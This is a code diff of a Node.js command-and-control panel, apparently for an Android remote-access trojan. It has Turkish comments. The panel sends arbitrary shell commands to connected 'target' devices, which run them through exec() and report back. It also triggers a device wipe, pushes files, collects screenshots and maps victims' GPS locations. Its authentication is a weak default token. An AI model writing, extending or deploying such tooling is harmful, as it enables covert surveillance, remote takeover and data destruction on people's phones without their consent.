@@ -1,4 +1,4 @@
-// andro_panel_ultimate.js
+// andro_panel_ultimate_full.js
 const express = require('express');
 const app = express();
 const http = require('http').createServer(app);
@@ -6,186 +6,194 @@ const io = require('socket.io')(http);
 const { exec } = require('child_process');
 const fs = require('fs');
 const path = require('path');
-const sqlite3 = require('sqlite3').verbose();
 
-// --- AYARLAR ---
-const PORT = process.env.PORT || 9400;
-const ADMIN_TOKEN = "PRO_SECRET_2026"; 
+// --- Ayarlar ---
+const PORT = process.argv[2] || 9400;
+const ADMIN_TOKEN = process.argv[3] || 'ULTIMATE_2026';
 const UPLOAD_DIR = path.join(__dirname, 'uploads');
-const SCREENSHOT_DIR = path.join(__dirname, 'screenshots');
+const SCREENSHOT_DIR = path.join(__dirname,'screenshots');
 
-// --- VERİTABANI VE DOSYA SİSTEMİ ---
-if (!fs.existsSync(UPLOAD_DIR)) fs.mkdirSync(UPLOAD_DIR);
-if (!fs.existsSync(SCREENSHOT_DIR)) fs.mkdirSync(SCREENSHOT_DIR);
+[UPLOAD_DIR, SCREENSHOT_DIR].forEach(d=>{if(!fs.existsSync(d)) fs.mkdirSync(d);});
 
-const db = new sqlite3.Database('./database.db');
-db.serialize(() => {
+// --- Veritabanı (SQLite) ---
+let sqlite3;
+try { sqlite3 = require('sqlite3').verbose(); }
+catch(e){ console.error("Lütfen sqlite3 kurun: npm install sqlite3"); process.exit(1); }
+const db = new sqlite3.Database('./andro_full.db');
+db.serialize(()=>{
     db.run(`CREATE TABLE IF NOT EXISTS devices (
-        id TEXT PRIMARY KEY, 
-        name TEXT, 
-        model TEXT, 
-        os_version TEXT, 
-        last_ip TEXT, 
-        status TEXT,
-        last_seen DATETIME DEFAULT CURRENT_TIMESTAMP
+        id TEXT PRIMARY KEY, name TEXT, model TEXT, battery INTEGER, memory INTEGER, gps TEXT, status TEXT
     )`);
 });
 
-// --- GÜVENLİK ---
+// --- Express ---
 app.use(express.static(__dirname));
-function auth(req, res, next) {
-    if (req.query.token === ADMIN_TOKEN) return next();
-    res.status(403).send("<h1>403 Forbidden</h1><p>Geçersiz Token.</p>");
-}
+app.use(express.urlencoded({extended:true}));
+app.use(express.json());
 
-// --- FRONTEND (EJS/HTML) ---
-app.get('/panel', auth, (req, res) => {
+// --- Panel ---
+app.get('/panel', (req,res)=>{
+    if(req.query.token!==ADMIN_TOKEN) return res.status(401).send("Yetkisiz Erişim!");
     res.send(`
 <!DOCTYPE html>
-<html lang="tr">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>ANDRO ULTIMATE CONTROL</title>
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
-    <script src="/socket.io/socket.io.js"></script>
-    <style>
-        body { background: #0f0f0f; color: #e0e0e0; font-family: 'Segoe UI', sans-serif; }
-        .card { background: #1a1a1a; border: 1px solid #333; margin-bottom: 20px; }
-        .terminal { background: #000; color: #00ff00; padding: 10px; height: 150px; overflow-y: auto; font-family: monospace; font-size: 12px; border-radius: 5px; }
-        .status-online { color: #00ff00; font-weight: bold; }
-        .status-offline { color: #ff4444; }
-        .nav-custom { background: #000; border-bottom: 2px solid #00ff00; padding: 10px; }
-        .badge-info { background: #007bff; }
-    </small>
-    </style>
+<title>ANDRO FULL PRO</title>
+<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+<script src="/socket.io/socket.io.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+<script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
+<link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css"/>
+<style>
+body{background:#0a0a0a;color:#00ff00;font-family:'Courier New',monospace;}
+.card{background:#151515;border:1px solid #00ff00;margin-top:10px;}
+.terminal{background:#000;height:100px;overflow-y:auto;padding:5px;border:1px solid #333;font-size:12px;}
+.online-blink{height:10px;width:10px;background:#00ff00;border-radius:50%;display:inline-block;animation:blink 1s infinite;}
+@keyframes blink{0%{opacity:1}50%{opacity:0}100%{opacity:1}}
+.thumbnail{width:60px;height:60px;object-fit:cover;margin:2px;border:1px solid #ccc;cursor:pointer;}
+#map{height:150px;margin-bottom:10px;border:1px solid #333;}
+</style>
 </head>
-<body>
-    <div class="nav-custom mb-4">
-        <div class="container d-flex justify-content-between">
-            <h4 class="m-0 text-success">⚡ ANDRO ULTIMATE <span class="text-white">v3.0</span></h4>
-            <span>Server: <span class="status-online">AKTİF</span></span>
-        </div>
-    </div>
+<body class="container-fluid">
+<h2 class="mt-3 text-center">--- ANDRO FULL PRO PANEL ---</h2>
+<div id="map"></div>
+<div class="row" id="devices"></div>
+<canvas id="statsChart" height="100"></canvas>
 
-    <div class="container">
-        <div class="row" id="deviceList">
+<script>
+const socket = io();
+let clients={};
+
+const map = L.map('map').setView([0,0],1);
+L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',{attribution:'&copy; OpenStreetMap'}).addTo(map);
+const markers={};
+
+function renderUI(){
+    const container=document.getElementById('devices');
+    container.innerHTML='';
+    let cmdData=[], fileData=[], ssData=[];
+    for(let id in clients){
+        const c=clients[id];
+        container.innerHTML+=\`
+        <div class="col-md-4">
+            <div class="card p-2">
+                <div class="d-flex justify-content-between">
+                    <span>\${c.name} [\${c.model}]</span>
+                    <span class="\${c.online?'online-blink':''}"></span>
+                </div>
+                <p>🔋 Pil: \${c.battery}% | Hafıza: \${c.memory}%</p>
+                <div class="terminal" id="term_\${id}"></div>
+                <input type="text" class="form-control form-control-sm bg-dark text-success mb-1" 
+                    id="in_\${id}" placeholder="Komut" onkeypress="if(event.keyCode==13) sendCmd('\${id}')">
+                <div class="d-flex gap-1">
+                    <button class="btn btn-sm btn-outline-success w-50" onclick="sendCmd('\${id}')">KOMUT</button>
+                    <button class="btn btn-sm btn-outline-danger w-50" onclick="wipe('\${id}')">WIPE</button>
+                </div>
+                <div class="mt-1">
+                    <label>Dosya Yükle:</label>
+                    <input type="file" id="file_\${id}" class="form-control form-control-sm" onchange="uploadFile(event,'\${id}')">
+                    <div id="progress_\${id}" class="progress mt-1"><div class="progress-bar bg-success" style="width:0%"></div></div>
+                </div>
+                <div class="mt-1">
+                    <label>Screenshot:</label>
+                    \${(c.screenshots||[]).map(f=>'<img src="/screenshots/'+f+'" class="thumbnail" onclick="window.open(this.src)"/>').join('')}
+                </div>
             </div>
-    </div>
+        </div>\`;
+        cmdData.push(c.logs?.length||0);
+        fileData.push(c.files?.length||0);
+        ssData.push(c.screenshots?.length||0);
 
-    <script>
-        const socket = io();
-        
-        socket.on('updateUI', (devices) => {
-            const list = document.getElementById('deviceList');
-            list.innerHTML = '';
-            Object.values(devices).forEach(dev => {
-                list.innerHTML += \`
-                <div class="col-md-6 col-lg-4">
-                    <div class="card shadow-lg">
-                        <div class="card-header d-flex justify-content-between">
-                            <strong>\${dev.name}</strong>
-                            <span class="\${dev.online ? 'status-online' : 'status-offline'}">
-                                \${dev.online ? '● ONLINE' : '● OFFLINE'}
-                            </span>
-                        </div>
-                        <div class="card-body">
-                            <p class="small mb-1">Model: \${dev.model} | OS: \${dev.os_version}</p>
-                            <p class="small mb-1">Pil: <span class="badge bg-success">%\${dev.battery || 100}</span> | RAM: %\${dev.ram_usage || 0}</p>
-                            <div class="terminal mb-2" id="term_\${dev.id}">$ Bekliyor...</div>
-                            <div class="input-group input-group-sm mb-2">
-                                <input type="text" class="form-control bg-dark text-white border-secondary" id="cmd_\${dev.id}" placeholder="Shell komutu...">
-                                <button class="btn btn-success" onclick="sendCmd('\${dev.id}')">GÖNDER</button>
-                            </div>
-                            <div class="btn-group w-100">
-                                <button class="btn btn-sm btn-outline-primary" onclick="reqAction('\${dev.id}', 'screenshot')">📸 SS Al</button>
-                                <button class="btn btn-sm btn-outline-warning" onclick="reqAction('\${dev.id}', 'vibrate')">📳 Titreş</button>
-                                <button class="btn btn-sm btn-outline-danger" onclick="reqAction('\${dev.id}', 'location')">📍 Konum</button>
-                            </div>
-                        </div>
-                    </div>
-                </div>\`;
-            });
-        });
-
-        function sendCmd(id) {
-            const cmd = document.getElementById('cmd_'+id).value;
-            socket.emit('admin_action', { targetId: id, type: 'shell', data: cmd });
-            document.getElementById('term_'+id).innerHTML += '<div>> ' + cmd + '</div>';
+        if(c.gps){
+            let coords=c.gps.split(',');
+            if(markers[id]) markers[id].setLatLng([parseFloat(coords[0]),parseFloat(coords[1])]);
+            else markers[id]=L.marker([parseFloat(coords[0]),parseFloat(coords[1])]).addTo(map).bindPopup(c.name);
         }
+    }
+    map.fitBounds(Object.values(markers).map(m=>m.getLatLng()),{padding:[20,20]});
 
-        function reqAction(id, type) {
-            socket.emit('admin_action', { targetId: id, type: type });
-        }
-
-        socket.on('output', (res) => {
-            const term = document.getElementById('term_'+res.id);
-            if(term) term.innerHTML += '<div class="text-info">' + res.data + '</div>';
-        });
-    </script>
-</body>
-</html>
-    `);
-});
-
-// --- SOCKET.IO MANTIĞI (SERVER SİDE) ---
-let liveClients = {};
-
-io.on('connection', (socket) => {
-    console.log('Bağlantı:', socket.id);
-
-    // Cihaz Kaydı ve DB Yazma
-    socket.on('register', (info) => {
-        liveClients[socket.id] = { ...info, id: socket.id, online: true };
-        db.run(`INSERT OR REPLACE INTO devices (id, name, model, os_version, last_ip, status) 
-                VALUES (?, ?, ?, ?, ?, 'online')`, 
-                [socket.id, info.name, info.model, info.os_version, socket.handshake.address]);
-        io.emit('updateUI', liveClients);
-    });
-
-    // Yönetici Hareketleri
-    socket.on('admin_action', (pkg) => {
-        io.to(pkg.targetId).emit('execute', pkg);
-    });
-
-    // Cihazdan Gelen Çıktılar
-    socket.on('report', (data) => {
-        io.emit('output', { id: socket.id, data: data });
-    });
-
-    socket.on('disconnect', () => {
-        if (liveClients[socket.id]) liveClients[socket.id].online = false;
-        io.emit('updateUI', liveClients);
-    });
-});
-
-// --- CLIENT SIMULATION (Target Device) ---
-// Bu kısım normalde Android cihazdaki serviste çalışır.
-function simulateTarget() {
-    const ioClient = require('socket.io-client');
-    const target = ioClient.connect(`http://localhost:${PORT}`);
-
-    target.on('connect', () => {
-        target.emit('register', {
-            name: "Hacker's Phone",
-            model: "Samsung S24 Ultra",
-            os_version: "Android 14",
-            battery: 92
-        });
-    });
-
-    target.on('execute', (pkg) => {
-        if (pkg.type === 'shell') {
-            exec(pkg.data, (err, stdout, stderr) => {
-                target.emit('report', stdout || stderr || "Komut tamamlandı.");
-            });
-        } else if (pkg.type === 'screenshot') {
-            target.emit('report', "Ekran görüntüsü alındı (Simülasyon)");
-        }
-    });
+    // Grafik
+    statsChart.data.labels=Object.keys(clients);
+    statsChart.data.datasets[0].data=cmdData;
+    statsChart.data.datasets[1].data=fileData;
+    statsChart.data.datasets[2].data=ssData;
+    statsChart.update();
 }
 
-// --- BAŞLAT ---
-http.listen(PORT, '0.0.0.0', () => {
-    console.log(`\n\x1b[32m[+] ANDRO PRO AKTİF: http://localhost:${PORT}/panel?token=${ADMIN_TOKEN}\x1b[0m`);
-    simulateTarget(); // Test için bir cihaz oluşturur
+function sendCmd(id){
+    const val=document.getElementById('in_'+id).value;
+    if(!val.trim()){alert('Komut boş!');return;}
+    socket.emit('admin_cmd',{target:id,cmd:val});
+}
+
+function wipe(id){socket.emit('admin_cmd',{target:id,cmd:'ACTION_WIPE'});}
+function uploadFile(e,id){
+    const file=document.getElementById('file_'+id).files[0];
+    if(!file){alert('Dosya seçin!');return;}
+    const reader=new FileReader();
+    reader.onload=()=>{socket.emit('fileUpload',{target:id,name:file.name,data:reader.result});
+        document.querySelector('#progress_'+id+' .progress-bar').style.width='100%';
+        setTimeout(()=>document.querySelector('#progress_'+id+' .progress-bar').style.width='0%',500);
+    }
+    reader.readAsDataURL(file);
+}
+
+// Grafik setup
+const ctx=document.getElementById('statsChart').getContext('2d');
+const statsChart=new Chart(ctx,{
+    type:'bar',
+    data:{labels:[],datasets:[
+        {label:'Komut',data:[],backgroundColor:'rgba(54,162,235,0.6)'},
+        {label:'Dosya',data:[],backgroundColor:'rgba(255,99,132,0.6)'},
+        {label:'Screenshot',data:[],backgroundColor:'rgba(75,192,192,0.6)'}
+    ]},
+    options:{responsive:true,scales:{y:{beginAtZero:true}}}
 });
+
+socket.on('updateUI',data=>{clients=data;renderUI();});
+socket.on('output',d=>{const t=document.getElementById('term_'+d.id);if(t){t.innerHTML+='<div>'+d.msg+'</div>';t.scrollTop=t.scrollHeight;}});
+</script>
+</body>
+</html>
+`);
+});
+
+// --- Dosya ve Screenshot route ---
+app.get('/screenshots/:file',(req,res)=>{const f=req.params.file;const p=path.join(SCREENSHOT_DIR,f);if(fs.existsSync(p)) res.sendFile(p); else res.status(404).send("Not found");});
+
+// --- SOCKET.IO ---
+let clients={};
+io.on('connection',socket=>{
+    console.log('Yeni bağlandı:',socket.id);
+    socket.on('register',data=>{
+        clients[socket.id]={...data,id:socket.id,online:true,logs:[],files:[],screenshots:[]};
+        io.emit('updateUI',clients);
+    });
+    socket.on('admin_cmd',pkg=>{
+        io.to(pkg.target).emit('exec',pkg.cmd);
+    });
+    socket.on('fileUpload',pkg=>{
+        const base64=pkg.data.split(',')[1];
+        fs.writeFileSync(path.join(UPLOAD_DIR,pkg.name),Buffer.from(base64,'base64'));
+        if(clients[pkg.target]) clients[pkg.target].files.push(pkg.name);
+        io.emit('updateUI',clients);
+    });
+    socket.on('screenshot',pkg=>{
+        const base64=pkg.data.split(',')[1];
+        const fpath=path.join(SCREENSHOT_DIR,pkg.name);
+        fs.writeFileSync(fpath,Buffer.from(base64,'base64'));
+        if(clients[socket.id]) clients[socket.id].screenshots.push(pkg.name);
+        io.emit('updateUI',clients);
+    });
+    socket.on('resp',msg=>{io.emit('output',{id:socket.id,msg:msg});});
+    socket.on('disconnect',()=>{if(clients[socket.id]) clients[socket.id].online=false;io.emit('updateUI',clients);});
+});
+
+// --- TEST CLIENT ---
+const ioClient=require('socket.io-client');
+const client=ioClient.connect(`http://localhost:${PORT}`);
+client.on('connect',()=>{client.emit('register',{name:'TestDevice',model:'Android14',battery:90,memory:60,gps:'37.7749,-122.4194'});});
+client.on('exec',cmd=>{exec(cmd,(err,stdout,stderr)=>{client.emit('resp',stdout||stderr||"İşlem tamam");});});
+
+// --- START SERVER ---
+http.listen(PORT,()=>{console.log(`\x1b[32m[+] Panel aktif: http://localhost:${PORT}/panel?token=${ADMIN_TOKEN}\x1b[0m`);});
